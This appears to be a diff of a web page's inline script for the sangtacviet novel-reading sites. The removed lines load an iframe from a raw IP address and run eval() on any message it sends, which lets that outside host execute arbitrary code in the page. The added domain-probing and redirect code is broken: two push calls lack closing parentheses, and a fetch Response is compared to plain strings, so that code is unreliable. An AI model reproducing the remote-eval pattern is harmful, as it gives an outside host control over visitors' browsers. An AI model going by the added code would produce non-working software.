@@ -16,12 +16,40 @@
 </style>
 </head>
 <body>
-<iframe src="http://14.225.254.182/"></iframe>
 <script>
-	window.addEventListener("message", function(e){
-		if(e.origin == "http://14.225.254.182"){
-			eval(e.data);
+	var domains = ["sangtacviet.com","sangtacviet.pro"];
+	var ssl = false;
+	var index = 0;
+	var ssc = [];
+	async function warpNext(){
+		if(!domains[index]){
+			if(ssc.length == 0){
+				return noSite();
+			}
+			var pass = ssc.filter(obj => obj.logged);
+			if(pass.length > 0){
+				location.href = pass[0].host + (location.pathname || location.path);
+			}else{
+				location.href = ssc[0].host + (location.pathname || location.path);
+			}
+			return;
 		}
-	});
+		var prot = ssl ? "https" : "http";
+		var warpUrl = `${prot}://${domains[index]}/warp.php`;
+		var rsp = await fetch(warpUrl,{credentials: 'include'}).catch(err=>{
+			ssl = !ssl;
+			index++;
+			warpNext();
+		});
+		if(rsp == "yes"){
+			ssc.push({host:`${prot}://${domains[index]}`,logged: true};
+		}else if(rsp == "no"){
+			ssc.push({host:`${prot}://${domains[index]}`,logged: false};
+		}else{
+			ssl = !ssl;
+			index++;
+			warpNext();
+		}
+	}
 </script>
 </body>
